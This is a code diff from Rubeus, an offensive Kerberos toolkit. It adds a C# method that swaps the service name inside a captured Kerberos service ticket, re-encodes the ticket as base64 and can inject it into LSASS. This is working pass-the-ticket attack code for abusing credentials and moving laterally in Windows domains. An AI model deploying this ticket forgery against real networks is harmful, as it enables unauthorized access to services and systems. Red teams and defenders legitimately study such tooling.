+++ Rubeus/lib/LSA.cs
@@ -108,6 +108,52 @@ namespace Rubeus
             return luid;
         }
 
+        public static void SubstituteTGSSname(KRB_CRED kirbi, string altsname, bool ptt = false, Interop.LUID luid = new Interop.LUID())
+        {
+            // subtitutes in an alternate servicename (sname) into a supplied service ticket
+
+            Console.WriteLine("\r\n[*] Action: Service Ticket sname Substitution\r\n");
+
+            Console.WriteLine("[*] Substituting in alternate service name: {0}", altsname);
+
+            List<string> name_string = new List<string>();
+            string[] parts = altsname.Split('/');
+            if (parts.Length == 1)
+            {
+                // sname alone
+                kirbi.tickets[0].sname.name_string[0] = parts[0]; // ticket itself
+                kirbi.enc_part.ticket_info[0].sname.name_string[0] = parts[0]; // enc_part of the .kirbi
+            }
+            else if (parts.Length == 2)
+            {
+                name_string.Add(parts[0]);
+                name_string.Add(parts[1]);
+
+                kirbi.tickets[0].sname.name_string = name_string; // ticket itself
+                kirbi.enc_part.ticket_info[0].sname.name_string = name_string; // enc_part of the .kirbi
+            }
+
+            byte[] kirbiBytes = kirbi.Encode().Encode();
+
+            string kirbiString = Convert.ToBase64String(kirbiBytes);
+
+            Console.WriteLine("[*] base64(ticket.kirbi):\r\n", kirbiString);
+
+            // display the .kirbi base64, columns of 80 chararacters
+            foreach (string line in Helpers.Split(kirbiString, 80))
+            {
+                Console.WriteLine("      {0}", line);
+            }
+
+            DisplayTicket(kirbi, false);
+
+            if (ptt || ((ulong)luid != 0))
+            {
+                // pass-the-ticket -> import into LSASS
+                LSA.ImportTicket(kirbiBytes, luid);
+            }
+        }
+
         public static void ImportTicket(byte[] ticket, Interop.LUID targetLuid)
         {
             Console.WriteLine("\r\n[*] Action: Import Ticket");